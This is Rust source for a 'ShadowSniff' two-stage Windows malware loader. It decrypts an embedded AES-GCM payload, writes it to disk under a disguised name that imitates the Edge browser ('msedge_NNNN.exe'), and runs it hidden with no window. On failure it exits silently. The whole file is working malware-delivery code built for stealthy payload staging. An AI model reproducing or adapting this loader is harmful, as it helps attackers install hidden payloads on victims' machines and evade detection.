//! ShadowSniff two-stage loader: embedded AES-256-GCM payload, decrypted at
//! runtime, dropped to %TEMP% and executed. Payload + key are supplied by the
//! builder at compile time (`BUILDER_PAYLOAD_FILE`, `BUILDER_KEY_EXPR`).

#![windows_subsystem = "windows"]

use core::ffi::c_void;
use core::iter::once;
use core::mem::zeroed;
use core::ptr::null_mut;
use windows_sys::Win32::Security::Cryptography::{
    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO,
    BCRYPT_CHAIN_MODE_GCM, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE, BCRYPT_SHA256_ALGORITHM,
    BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDeriveKeyPBKDF2,
    BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider,
    BCryptSetProperty,
};
use windows_sys::Win32::Storage::FileSystem::{CreateFileW, WriteFile};
use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;
use windows_sys::Win32::System::Threading::{
    CreateProcessW, CREATE_NO_WINDOW, PROCESS_INFORMATION, STARTUPINFOW,
};

const MAGIC: &[u8; 6] = b"SNAES1";
const SALT_LEN: usize = 16;
const NONCE_LEN: usize = 12;
const TAG_LEN: usize = 16;

mod keyfile {
    include!(env!("KEY_PATH"));
}

static PAYLOAD: &[u8] = include_bytes!(env!("PAYLOAD_PATH"));

fn derive_key(password: &[u8], salt: &[u8]) -> Option<Vec<u8>> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();

    let status = unsafe {
        BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_SHA256_ALGORITHM, null_mut(), 0x0000_0400)
    };
    if status != 0 {
        return None;
    }

    let mut key = vec![0u8; 32];
    let status = unsafe {
        BCryptDeriveKeyPBKDF2(
            alg,
            password.as_ptr(),
            password.len() as _,
            salt.as_ptr(),
            salt.len() as _,
            10_000,
            key.as_mut_ptr(),
            key.len() as _,
            0,
        )
    };

    unsafe { BCryptCloseAlgorithmProvider(alg, 0) };

    (status == 0).then_some(key)
}

fn gcm_open(key: &[u8], nonce: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();
    let mut key_handle: BCRYPT_KEY_HANDLE = null_mut();

    let status =
        unsafe { BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_AES_ALGORITHM, null_mut(), 0) };
    if status != 0 {
        return None;
    }

    let status = unsafe {
        BCryptSetProperty(
            alg,
            BCRYPT_CHAINING_MODE,
            BCRYPT_CHAIN_MODE_GCM as *const _,
            32,
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let status = unsafe {
        BCryptGenerateSymmetricKey(
            alg,
            &mut key_handle,
            null_mut(),
            0,
            key.as_ptr() as *mut _,
            key.len() as _,
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        cbSize: size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32,
        dwInfoVersion: 1,
        pbNonce: nonce.as_ptr() as *mut u8,
        cbNonce: nonce.len() as u32,
        pbAuthData: null_mut(),
        cbAuthData: 0,
        pbTag: tag.as_ptr() as *mut u8,
        cbTag: tag.len() as u32,
        pbMacContext: null_mut(),
        cbMacContext: 0,
        cbAAD: 0,
        cbData: 0,
        dwFlags: 0,
    };

    let mut plain = vec![0u8; ct.len()];
    let mut plain_size: u32 = 0;

    let status = unsafe {
        BCryptDecrypt(
            key_handle,
            ct.as_ptr() as *const _,
            ct.len() as _,
            &auth_info as *const _ as *mut c_void,
            null_mut(),
            0,
            plain.as_mut_ptr(),
            plain.len() as _,
            &mut plain_size,
            0,
        )
    };

    unsafe {
        BCryptDestroyKey(key_handle);
        BCryptCloseAlgorithmProvider(alg, 0);
    }

    if status != 0 {
        None
    } else {
        plain.truncate(plain_size as usize);
        Some(plain)
    }
}

fn decrypt_payload() -> Option<Vec<u8>> {
    if PAYLOAD.len() < 8 + SALT_LEN + NONCE_LEN + TAG_LEN || &PAYLOAD[..6] != MAGIC {
        return None;
    }

    let salt = &PAYLOAD[8..8 + SALT_LEN];
    let nonce = &PAYLOAD[8 + SALT_LEN..8 + SALT_LEN + NONCE_LEN];
    let body = &PAYLOAD[8 + SALT_LEN + NONCE_LEN..];
    if body.len() < TAG_LEN {
        return None;
    }

    let (ct, tag) = body.split_at(body.len() - TAG_LEN);
    let key = derive_key(&keyfile::KEY, salt)?;
    gcm_open(&key, nonce, ct, tag)
}

fn drop_and_run(plain: &[u8]) -> bool {
    unsafe {
        let mut temp = [0u16; 512];
        let len = GetModuleFileNameW(null_mut(), temp.as_mut_ptr(), 400);
        if len == 0 {
            return false;
        }

        // Same directory as ourselves, random name.
        let mut name = String::from_utf16_lossy(&temp[..len as usize]);
        let slash = name.rfind('\\').unwrap_or(0);
        name.truncate(slash + 1);
        name.push_str(&format!("msedge_{}.exe", core::ptr::addr_of!(plain) as u64 & 0xFFFF));

        let wide_path: Vec<u16> = name.encode_utf16().chain(once(0)).collect();

        let handle = CreateFileW(
            wide_path.as_ptr(),
            (1u32 << 31) | 0x40000000, // GENERIC_WRITE
            0,
            null_mut(),
            2, // CREATE_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            null_mut(),
        );

        if handle as isize == -1 {
            return false;
        }

        let mut written: u32 = 0;
        let ok = WriteFile(handle, plain.as_ptr() as _, plain.len() as u32, &mut written, null_mut()) != 0;
        windows_sys::Win32::Foundation::CloseHandle(handle);

        if !ok || written as usize != plain.len() {
            return false;
        }

        let mut si: STARTUPINFOW = zeroed();
        si.cb = size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let mut cmd: Vec<u16> = wide_path[..wide_path.len() - 1].to_vec();
        cmd.push(0);

        CreateProcessW(
            wide_path.as_ptr(),
            cmd.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) != 0
    }
}

fn main() {
    if let Some(plain) = decrypt_payload()
        && drop_and_run(&plain)
    {
        return; // stage-2 is running; loader bows out.
    }

    // Silent failure: nothing to see here.
}
